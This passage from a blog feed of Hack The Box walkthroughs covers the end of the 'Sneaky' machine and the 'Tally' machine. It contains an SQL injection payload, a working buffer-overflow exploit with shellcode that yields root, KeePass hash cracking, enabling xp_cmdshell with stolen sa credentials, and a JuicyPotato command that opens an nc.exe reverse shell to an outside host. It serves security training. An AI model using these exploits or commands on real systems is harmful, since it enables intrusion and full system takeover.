is up (0.10s latency). Not shown: 65454 filtered tcp ports (no-response), 79 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds └─$ nmap -6 -Pn -p22,80 -sC -sV dead:beef:0000:0000:0250:56ff:feb9:642b --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 19:43 BST Nmap scan report for dead:beef::250:56ff:feb9:642b Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA) | 2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA) | 256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA) |_ 256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: 400 Bad Request |_http-server-header: Apache/2.4.7 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | address-info: | IPv6 EUI-64: | MAC address: | address: 00:50:56:b9:64:2b |_ manuf: VMware Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds Foothold/User http://10.10.10.20/dev/ If we send test' we receive error back indicating possible sqli Trying basic sqli payload works test' or 1=1;-- - We have a ssh key We can ssh as thrasivoulos └─$ ssh thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:642b -i id_rsa Warning: Permanently added \u0026#39;dead:beef::250:56ff:feb9:642b\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686) * Documentation: https://help.ubuntu.com/ System information as of Sun Oct 15 21:18:38 EEST 2023 System load: 0.0 Memory usage: 4% Processes: 175 Usage of /: 40.9% of 3.32GB Swap usage: 0% Users logged in: 0 Graph this data and manage this system at: https://landscape.canonical.com/ Your Hardware Enablement Stack (HWE) is supported until April 2019. Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077 thrasivoulos@Sneaky:~$ Root I\u0026rsquo;ll run linpeas We have interesting suid file ╔══════════╣ SUID - Check easy privesc, exploits and write perms ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 root root 67K Nov 24 2016 /bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 35K May 4 2017 /bin/su -rwsr-xr-x 1 root root 87K Nov 24 2016 /bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 43K May 8 2014 /bin/ping6 -rwsr-xr-x 1 root root 30K May 15 2015 /bin/fusermount -rwsr-xr-x 1 root root 39K May 8 2014 /bin/ping -rwsrwsr-x 1 root root 7.2K May 4 2017 /usr/local/bin/chal (Unknown SUID binary!) -rwsr-sr-x 1 libuuid libuuid 18K Nov 24 2016 /usr/sbin/uuidd -rwsr-xr-- 1 root dip 316K Apr 21 2015 /usr/sbin/pppd ---\u0026gt; Apple_Mac_OSX_10.4.8(05-2007) -rwsr-sr-x 1 daemon daemon 46K Oct 21 2013 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 18K Nov 24 2015 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-xr-x 1 root root 18K May 8 2014 /usr/bin/traceroute6.iputils -rwsr-xr-x 1 root root 36K May 4 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 65K May 4 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 45K May 4 2017 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 72K Oct 21 2013 /usr/bin/mtr -rwsr-xr-x 1 root root 31K May 4 2017 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 154K Oct 14 2016 /usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable -rwsr-xr-x 1 root root 44K May 4 2017 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-- 1 root messagebus 327K Dec 7 2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 482K Aug 11 2016 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 9.6K Nov 24 2015 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 5.4K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device I\u0026rsquo;ll grab the file └─$ scp -6 -i id_rsa thrasivoulos@[dead:beef:0000:0000:0250:56ff:feb9:642b]:/usr/local/bin/chal ./ chal 100% 7301 23.8KB/s 00:00 Let\u0026rsquo;s analyze └─$ ltrace ./chal __libc_start_main(0x804841d, 1, 0xffdbc244, 0x8048450 \u0026lt;unfinished ...\u0026gt; strcpy(0xffdbc022, nil \u0026lt;no return ...\u0026gt; --- SIGSEGV (Segmentation fault) --- +++ killed by SIGSEGV +++ └─$ ltrace ./chal AAAA __libc_start_main(0x804841d, 2, 0xffeead44, 0x8048450 \u0026lt;unfinished ...\u0026gt; strcpy(0xffeeab22, \u0026#34;AAAA\u0026#34;) = 0xffeeab22 +++ exited (status 0) +++ Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments Let\u0026rsquo;s find offset └─$ msf-pattern_create -l 500 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq └─$ msf-pattern_offset -q 0Am1 [*] Exact match at offset 362 We can test by sending payload with 362 As and 4 Bs └─$ python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*362 + \u0026#34;BBBB\u0026#34;)\u0026#39; Now we have to find an address of the buffer We have to run it on the box to find the correct address since the box is 32-bit The address stays the same, we could choose any address within the buffer We need the shellcode I tried several shellcodes, this one worked http://shell-storm.org/shellcode/files/shellcode-811.html import sys offset = 362 shell = b\u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#34; nop = b\u0026#34;\\x90\u0026#34; * (offset - len(shell)) eip = b\u0026#34;\\x48\\xf7\\xff\\xbf\u0026#34; payload = nop + shell + eip sys.stdout.buffer.write(payload) Use the following script to supply input in raw bytes thrasivoulos@Sneaky:/tmp$ chal $(python3 exploit.py) # id uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos) ","date":"September 30, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sneaky/images/sneaky.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sneaky/","summary":"Sneaky Enumeration nmap └─$ nmap -Pn -p- 10.10.10.20 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:49 BST Warning: 10.10.10.20 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.20 (10.10.10.20) Host is up (0.10s latency). Not shown: 54464 filtered tcp ports (no-response), 6 filtered tcp ports (host-unreach), 11064 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 70.","tags":["HTB","udp","snmp","mibs","sqli","injection","auth-bypass","onesixtyone","snmpwalk","ipv6","suid","bof","pwn","reverse-engineering","ghidra","gdb","shellcode"],"title":"[HTB] Machine: Sneaky"},{"categories":null,"contents":"Tally Enumeration nmap └─$ nmap -Pn -p- 10.10.10.59 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:46 BST Warning: 10.10.10.59 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.59 (10.10.10.59) Host is up (0.10s latency). Not shown: 60269 filtered tcp ports (no-response), 5257 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 81/tcp open hosts2-ns 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 808/tcp open ccproxy-http 1433/tcp open ms-sql-s 5985/tcp open wsman 15567/tcp open unknown 32843/tcp open unknown 32844/tcp open unknown 32846/tcp open unknown 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 83.60 seconds └─$ nmap -Pn -p21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664-49670 -sC -sV 10.10.10.59 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:51 BST Nmap scan report for 10.10.10.59 (10.10.10.59) Host is up (0.10s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-title: Home |_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx |_http-generator: Microsoft SharePoint 81/tcp filtered hosts2-ns 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 808/tcp filtered ccproxy-http 1433/tcp open ms-sql-s Microsoft SQL Server 2016 13.00.1601.00; RTM | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-09-30T19:38:29 |_Not valid after: 2053-09-30T19:38:29 | ms-sql-info: | 10.10.10.59:1433: | Version: | name: Microsoft SQL Server 2016 RTM | number: 13.00.1601.00 | Product: Microsoft SQL Server 2016 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2023-09-30T19:52:36+00:00; -3s from scanner time. | ms-sql-ntlm-info: | 10.10.10.59:1433: | Target_Name: TALLY | NetBIOS_Domain_Name: TALLY | NetBIOS_Computer_Name: TALLY | DNS_Domain_Name: TALLY | DNS_Computer_Name: TALLY |_ Product_Version: 10.0.14393 5985/tcp filtered wsman 15567/tcp open http Microsoft IIS httpd 10.0 | http-ntlm-info: | Target_Name: TALLY | NetBIOS_Domain_Name: TALLY | NetBIOS_Computer_Name: TALLY | DNS_Domain_Name: TALLY | DNS_Computer_Name: TALLY |_ Product_Version: 10.0.14393 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D | Negotiate |_ NTLM |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title. 32843/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 32844/tcp filtered unknown 32846/tcp open storagecraft-image StorageCraft Image Manager 47001/tcp filtered winrm 49664/tcp filtered unknown 49665/tcp filtered unknown 49666/tcp filtered unknown 49667/tcp filtered unknown 49668/tcp filtered unknown 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: -2s, deviation: 0s, median: -3s | smb2-time: | date: 2023-09-30T19:52:30 |_ start_date: 2023-09-30T19:38:08 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.85 seconds Web server feroxbuster └─$ feroxbuster -u http://10.10.10.59/_layouts -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.59/_layouts 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 301 GET 2l 10w 151c http://10.10.10.59/_layouts =\u0026gt; http://10.10.10.59/_layouts/ 301 GET 2l 10w 158c http://10.10.10.59/_layouts/images =\u0026gt; http://10.10.10.59/_layouts/images/ 301 GET 2l 10w 155c http://10.10.10.59/_layouts/inc =\u0026gt; http://10.10.10.59/_layouts/inc/ 301 GET 2l 10w 158c http://10.10.10.59/_layouts/styles =\u0026gt; http://10.10.10.59/_layouts/styles/ 301 GET 2l 10w 158c http://10.10.10.59/_layouts/mobile =\u0026gt; http://10.10.10.59/_layouts/mobile/ It\u0026rsquo;s a sharepoint We can enum it using this post Documents have 1 item It contains the password for ftp UTDRSCH53c\u0026quot;$6hys Site Pages also contain 1 item I had to add tally to /etc/hosts to see the content We have possible usernames: rahul, sarah, tim And also ftp_user account ftp ftp_user:UTDRSCH53c\u0026quot;$6hys └─$ ftp 10.10.10.59 Connected to 10.10.10.59. 220 Microsoft FTP Service Name (10.10.10.59:kali): ftp_user 331 Password required Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||49816|) 125 Data connection already open; Transfer starting. 08-31-17 11:51PM \u0026lt;DIR\u0026gt; From-Custodian 10-01-17 11:37PM \u0026lt;DIR\u0026gt; Intranet 08-28-17 06:56PM \u0026lt;DIR\u0026gt; Logs 09-15-17 09:30PM \u0026lt;DIR\u0026gt; To-Upload 09-17-17 09:27PM \u0026lt;DIR\u0026gt; User 226 Transfer complete. ftp\u0026gt; Let\u0026rsquo;s download everything ─$ wget -r \u0026#39;ftp://ftp_user:UTDRSCH53c\u0026#34;$6hys@10.10.10.59\u0026#39; --2023-10-01 20:33:13-- ftp://ftp_user:*password*@10.10.10.59/ =\u0026gt; ‘10.10.10.59/.listing’ Connecting to 10.10.10.59:21... connected. Logging in as ftp_user ... Logged in! ==\u0026gt; SYST ... done. ==\u0026gt; PWD ... done. ==\u0026gt; TYPE I ... done. ==\u0026gt; CWD not needed. ==\u0026gt; PASV ... done. ==\u0026gt; LIST ... done. ... We have a User folder inside └─$ ls -lha total 44K drwxr-xr-x 11 kali kali 4.0K Oct 1 20:38 . drwxr-xr-x 7 kali kali 4.0K Oct 1 20:35 .. drwxr-xr-x 3 kali kali 4.0K Oct 1 20:35 Administrator drwxr-xr-x 2 kali kali 4.0K Oct 1 20:35 Ekta drwxr-xr-x 2 kali kali 4.0K Oct 1 20:35 Jess drwxr-xr-x 3 kali kali 4.0K Oct 1 20:36 Paul drwxr-xr-x 3 kali kali 4.0K Oct 1 20:36 Rahul drwxr-xr-x 2 kali kali 4.0K Oct 1 20:36 Sarah drwxr-xr-x 2 kali kali 4.0K Oct 1 20:37 Stuart drwxr-xr-x 4 kali kali 4.0K Oct 1 20:38 Tim drwxr-xr-x 3 kali kali 4.0K Oct 1 20:38 Yenwi └─$ find . -type f ./Ekta/OFSI_quick_guide_flyer.pdf ./Ekta/PSAIS_1_April_2017.pdf ./Paul/financial_sanctions_guidance_august_2017.pdf ./Paul/Monetary_penalties_for_breaches_of_financial_sanctions.pdf ./Paul/financial-list-guide.pdf ./Jess/actu8-espreadsheet-designer-datasheet.pdf ./Tim/Files/tim.kdbx ./Tim/Files/bonus.txt ./Tim/Files/KeePass-2.36/KeePass.XmlSerializers.dll ./Tim/Files/KeePass-2.36/KeePassLibC64.dll ./Tim/Files/KeePass-2.36/License.txt ./Tim/Files/KeePass-2.36/KeePass.chm ./Tim/Files/KeePass-2.36/KeePass.exe ./Tim/Files/KeePass-2.36/KeePassLibC32.dll ./Tim/Files/KeePass-2.36/ShInstUtil.exe ./Tim/Files/KeePass-2.36/KeePass.exe.config ./Tim/Project/Log/do to.txt ./Stuart/Unit4-Connect-Financials-Agenda.pdf ./Stuart/customers - Copy.csv ./Sarah/Windows-KB890830-x64-V5.52.exe ./Sarah/notes.txt ./Sarah/MBSASetup-x64-EN.msi We have tim.kdbx Let\u0026rsquo;s crack it └─$ keepass2john tim.kdbx \u0026gt; tim.kdbx.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt tim.kdbx.hash Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 6000 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status simplementeyo (tim) 1g 0:00:00:17 DONE (2023-10-02 16:45) 0.05861g/s 1447p/s 1447c/s 1447C/s simplementeyo..sept17 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Let\u0026rsquo;s open keepass We have a creds for share Finance:Acc0unting Let\u0026rsquo;s test them └─$ crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting SMB 10.10.10.59 445 TALLY [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True) SMB 10.10.10.59 445 TALLY [+] TALLY\\Finance:Acc0unting Now we can access ACCT share └─$ smbmap -H 10.10.10.59 -u Finance -p Acc0unting [+] IP: 10.10.10.59:445 Name: tally Disk Permissions Comment ---- ----------- ------- ACCT READ ONLY ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC └─$ smbclient //10.10.10.59/ACCT -U \u0026#39;Finance%Acc0unting\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Sep 18 06:58:18 2017 .. D 0 Mon Sep 18 06:58:18 2017 Customers D 0 Sun Sep 17 21:28:40 2017 Fees D 0 Mon Aug 28 22:20:52 2017 Invoices D 0 Mon Aug 28 22:18:19 2017 Jess D 0 Sun Sep 17 21:41:29 2017 Payroll D 0 Mon Aug 28 22:13:32 2017 Reports D 0 Fri Sep 1 21:50:11 2017 Tax D 0 Sun Sep 17 21:45:47 2017 Transactions D 0 Wed Sep 13 20:57:44 2017 zz_Archived D 0 Fri Sep 15 21:29:35 2017 zz_Migration D 0 Sun Sep 17 21:49:13 2017 8387839 blocks of size 4096. 589404 blocks available I couldn\u0026rsquo;t donwload everything from the smb So I had to mount it └─$ sudo mount -t cifs -o user=Finance,pass=Acc0unting //10.10.10.59/ACCT /mnt/smb [sudo] password for kali: └─$ ls /mnt/smb Customers Fees Invoices Jess Payroll Reports Tax Transactions zz_Archived zz_Migration Scanning through the files results in interesting file: ./zz_Archived/SQL/conn-info.txt └─$ cat ./zz_Archived/SQL/conn-info.txt old server details db: sa pass: YE%TJC%\u0026amp;HYbe5Nw have changed for tally But it states, that the creds were changed for tally We also have zz_Migration/Binaries directory └─$ find . -type f | grep -v cap ./CardReader/RapportSetup.exe ./FileZilla_Server-0_9_60_2.exe ./ImportGSTIN.zip ./NDP452-KB2901907-x86-x64-AllOS-ENU.exe ./New folder/crystal_reports_viewer_2016_sp04_51051980.zip ./New folder/Macabacus2016.exe ./New folder/Orchard.Web.1.7.3.zip ./New folder/putty.exe ./New folder/RpprtSetup.exe ./New folder/tableau-desktop-32bit-10-3-2.exe ./New folder/tester.exe ./New folder/vcredist_x64.exe ./Sage50_2017.2.0.exe ./Tally.ERP 9 Release 6/regodbc32.exe ./Tally.ERP 9 Release 6/Setup.exe ./Tally.ERP 9 Release 6/tally.exe ./Tally.ERP 9 Release 6/tally.ini ./Tally.ERP 9 Release 6/Tally.sav ./Tally.ERP 9 Release 6/tallygatewayserver.exe ./Tally.ERP 9 Release 6/tallywin.dat ./Tally.ERP 9 Release 6/tallywin32.dat ./Tally.ERP 9 Release 6/tdlfunc.log ./windirstat1_1_2_setup.exe Inside we see a tester.exe which looks like it\u0026rsquo;s not a commercial software └─$ strings tester.exe !This program cannot be run in DOS mode. Rich7J .text ... ^_[3 SQLSTATE: Message: DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G; select * from Orchard_Users_UserPartRecord Unknown exception bad cast ... Let\u0026rsquo;s test the creds sa:GWE3V65#6KFH93@4GWTG2G └─$ crackmapexec mssql 10.10.10.59 -u sa -p \u0026#39;GWE3V65#6KFH93@4GWTG2G\u0026#39; --local-auth MSSQL 10.10.10.59 1433 TALLY [*] Windows 10.0 Build 14393 (name:TALLY) (domain:TALLY) MSSQL 10.10.10.59 1433 TALLY [+] sa:GWE3V65#6KFH93@4GWTG2G (Pwn3d!) Foothold/ User #1 Let\u0026rsquo;s connect using impacket-mssqlclient └─$ impacket-mssqlclient sa:\u0026#39;GWE3V65#6KFH93@4GWTG2G\u0026#39;@10.10.10.59 Impacket v0.11.0 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(TALLY): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(TALLY): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (130 665) [!] Press help for extra shell commands SQL (sa dbo@master)\u0026gt; Let\u0026rsquo;s enumerate https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server It looks like we can enable xp_cmdshell and execute os commands └─$ impacket-mssqlclient sa:\u0026#39;GWE3V65#6KFH93@4GWTG2G\u0026#39;@10.10.10.59 Impacket v0.11.0 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(TALLY): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(TALLY): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (130 665) [!] Press help for extra shell commands SQL (sa dbo@master)\u0026gt; EXEC master..xp_cmdshell \u0026#39;whoami\u0026#39;; [-] ERROR(TALLY): Line 1: SQL Server blocked access to procedure \u0026#39;sys.xp_cmdshell\u0026#39; of component \u0026#39;xp_cmdshell\u0026#39; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of \u0026#39;xp_cmdshell\u0026#39; by using sp_configure. For more information about enabling \u0026#39;xp_cmdshell\u0026#39;, search for \u0026#39;xp_cmdshell\u0026#39; in SQL Server Books Online. SQL (sa dbo@master)\u0026gt; sp_configure \u0026#39;show advanced options\u0026#39;, \u0026#39;1\u0026#39;; [*] INFO(TALLY): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. SQL (sa dbo@master)\u0026gt; RECONFIGURE SQL (sa dbo@master)\u0026gt; sp_configure \u0026#39;xp_cmdshell\u0026#39;, \u0026#39;1\u0026#39; [*] INFO(TALLY): Line 185: Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. SQL (sa dbo@master)\u0026gt; RECONFIGURE SQL (sa dbo@master)\u0026gt; EXEC master..xp_cmdshell \u0026#39;whoami\u0026#39; output ----------- tally\\sarah NULL SQL (sa dbo@master)\u0026gt; Let\u0026rsquo;s get reverse shell I used Powershell #3 (Base64) from https://www.revshells.com/ Check 0xdf for an alternative path Root sarah has SeImpersonatePrivilege PS C:\\users\\sarah\\desktop\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled We can try Potato attack if we have nothing else We have SPBestWarmUp.ps1 It looks like it used to have a github page, but got deleted Googling shows that it was helping with caching IIS PS C:\\users\\sarah\\desktop\u0026gt; ls Directory: C:\\users\\sarah\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 01/10/2017 22:32 916 browser.bat -a---- 17/09/2017 21:50 845 FTP.lnk -a---- 23/09/2017 21:11 297 note to tim (draft).txt -a---- 19/10/2017 21:49 17152 SPBestWarmUp.ps1 -a---- 19/10/2017 22:48 11010 SPBestWarmUp.xml -a---- 17/09/2017 21:48 1914 SQLCMD.lnk -a---- 21/09/2017 00:46 129 todo.txt -ar--- 01/10/2023 20:06 34 user.txt -a---- 17/09/2017 21:49 936 zz_Migration.lnk We also have SPBestWarmUp.xml It runs as Administrator and executes SPBestWarmUp.ps1 every hour PS C:\\users\\sarah\\desktop\u0026gt; type SPBestWarmUp.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02/mit/task\u0026#34;\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;CalendarTrigger\u0026gt; \u0026lt;Repetition\u0026gt; \u0026lt;Interval\u0026gt;PT1H\u0026lt;/Interval\u0026gt; \u0026lt;Duration\u0026gt;P1D\u0026lt;/Duration\u0026gt; ... \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;UserId\u0026gt;TALLY\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;Password\u0026lt;/LogonType\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; ... \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;PowerShell.exe\u0026lt;/Command\u0026gt; \u0026lt;Arguments\u0026gt;-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck\u0026lt;/Arguments\u0026gt; \u0026lt;WorkingDirectory\u0026gt;C:\\Users\\Sarah\\Desktop\u0026lt;/WorkingDirectory\u0026gt; \u0026lt;/Exec\u0026gt; ... We can replace the script, since we have a full control over it PS C:\\users\\sarah\\desktop\u0026gt; icacls SPBestWarmUp.ps1 SPBestWarmUp.ps1 NT AUTHORITY\\SYSTEM:(F) BUILTIN\\Administrators:(F) TALLY\\Sarah:(F) Successfully processed 1 files; Failed processing 0 files But I didn\u0026rsquo;t want to wait, so performed Potato attack https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato PS C:\\programdata\u0026gt; .\\jp.exe -l 1337 -c \u0026#34;{4991d34b-80a1-4291-83b6-3328366b9097}\u0026#34; -p c:\\windows\\system32\\cmd.exe -a \u0026#34;/c c:\\programdata\\nc.exe -e cmd.exe 10.10.16.9 7777\u0026#34; -t * Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337 ...... [+] authresult 0 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK The box is also vulnerable to CVE-2017-0213, you can check 0xdf for more information ","date":"September 30, 